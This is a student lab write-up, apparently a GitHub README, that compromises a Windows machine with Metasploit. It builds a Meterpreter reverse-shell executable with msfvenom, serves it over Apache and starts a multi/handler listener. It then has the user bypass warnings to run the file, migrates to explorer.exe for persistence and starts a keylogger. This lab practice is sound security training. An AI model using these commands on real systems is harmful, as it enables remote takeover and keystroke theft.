# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## OUTPUT:
![image](https://github.com/NARESHVB/Compromising-windows-using-Metasploit/assets/119393642/789e08b1-dbe9-41fa-a46c-69d84051f331)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:

![image](https://github.com/NARESHVB/Compromising-windows-using-Metasploit/assets/119393642/128d3dd1-5be3-4e6b-a694-b6832397db74)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/NARESHVB/Compromising-windows-using-Metasploit/assets/119393642/37b34a1a-247a-494e-916e-ec0ee36f5763)

Start apache server sudo systemctl apache2 start

![image](https://github.com/NARESHVB/Compromising-windows-using-Metasploit/assets/119393642/85225dea-3c20-443f-be6d-552d201c205c)


Check the status of apache2

![image](https://github.com/NARESHVB/Compromising-windows-using-Metasploit/assets/119393642/a7fa668e-edb7-476f-8916-c7d8b69591fd)

Invoke msfconsole:

## OUTPUT:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![image](https://github.com/NARESHVB/Compromising-windows-using-Metasploit/assets/119393642/095ba4f0-5586-47eb-8583-5f69bce2f303)


![image](https://github.com/NARESHVB/Compromising-windows-using-Metasploit/assets/119393642/2f506bf1-ab43-4412-97a2-b8b072f450aa)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/NARESHVB/Compromising-windows-using-Metasploit/assets/119393642/7c98c574-ce15-4696-983c-f04f30f850e7)



Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/NARESHVB/Compromising-windows-using-Metasploit/assets/119393642/4f51fba0-82fb-4906-8589-6e7048e86e01)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

![image](https://github.com/NARESHVB/Compromising-windows-using-Metasploit/assets/119393642/4363560a-2a2d-4e56-b9cd-2ec85222274a)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted


![image](https://github.com/NARESHVB/Compromising-windows-using-Metasploit/assets/119393642/ae8ce960-73e7-4853-abbc-d8045b99d4cc)



Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.



![image](https://github.com/NARESHVB/Compromising-windows-using-Metasploit/assets/119393642/44530c81-9b21-468a-8437-f46495636096)


































## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
